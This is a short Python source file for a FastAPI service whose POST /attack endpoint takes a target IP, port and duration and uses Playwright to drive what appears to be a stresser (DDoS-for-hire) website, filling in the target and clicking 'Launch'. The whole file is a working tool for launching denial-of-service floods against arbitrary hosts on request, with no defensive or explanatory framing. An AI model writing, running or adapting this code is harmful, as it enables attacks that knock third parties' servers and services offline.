from fastapi import FastAPI
from pydantic import BaseModel
import uvicorn
import asyncio
from playwright.async_api import async_playwright
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = FastAPI()

class AttackRequest(BaseModel):
    ip: str
    port: int
    duration: int

playwright = None
browser = None

@app.on_event("startup")
async def startup():
    global playwright, browser
    logger.info("Starting browser...")
    playwright = await async_playwright().start()
    browser = await playwright.chromium.launch(
        headless=False,  # Visible browser
        args=['--no-sandbox']
    )

@app.get("/")
async def home():
    return {"status": "online", "message": "API running"}

@app.post("/attack")
async def attack(request: AttackRequest):
    try:
        page = await browser.new_page()
        
        # Website open
        await page.goto("https://satellitestress.st/attack")
        
        # Form fill
        await page.fill('input[placeholder*="104.29.138.132"]', request.ip)
        await page.fill('input[placeholder*="80"]', str(request.port))
        await page.fill('input[placeholder*="60"]', str(request.duration))
        
        # Launch click
        await page.click('button:has-text("Launch")')
        
        return {"status": "success", "message": "Attack started"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)
